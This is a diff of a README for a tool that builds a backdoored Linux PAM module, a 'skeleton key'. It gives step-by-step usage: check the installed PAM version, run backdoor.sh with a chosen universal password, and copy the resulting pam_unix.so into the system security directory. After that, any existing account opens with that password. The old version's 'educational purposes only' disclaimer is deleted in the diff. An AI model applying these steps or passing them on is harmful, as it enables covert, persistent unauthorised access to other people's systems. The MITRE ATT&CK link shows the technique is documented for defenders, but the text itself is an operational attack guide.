@@ -1,37 +1,28 @@
-# linux-pam-backdoor         
-Linux PAM Backdoor           
-                             
-This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)
-
-## Usage
-To generate the backdoored pam_unix.so, just run:
-```
-./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
-```
-
-You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.
-
-After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
-
-```
-cp pam_unix.so /usr/lib/security/
-```
-
-That's all. 
-
-After that, you can log-in to the system using an existing user, and the previously configured password.
-
-Use this for educational purposes only.
-I am not responsible for the damage you might cause.
+# Linux Skeleton Key              
+This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules). This is also known as a skeleton key.
 
 ## Dependencies 
-
-Tested with Ubuntu 20.04: 
-* 1.1.8 and older: failed to compile
-* 1.2.0: worked
-* 1.3.0 to 1.4.0: worked
-
-The following packages were used:
+Run the following before using this tool to ensure dependencies are installed.
 ```bash
 apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc
 ```
+
+## Usage
+To generate the backdoored pam_unix.so run the following (Debian Based) command to determine the existing version of pam_unix.so on the host:
+```sh
+dpkg -l | grep libpam0g
+```
+Once you have the version run the following command with the `-v` as the version you found using the previous command and `-p` as the skeleton key/universal password.
+```sh
+./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
+```
+You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.
+
+After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
+```sh
+cp ./pam_unix.so /lib/x86_64-linux-gnu/security
+```
+After that, you can login to the system using an existing user, and the previously configured password.
+
+## Resources
+- https://attack.mitre.org/software/S0007/
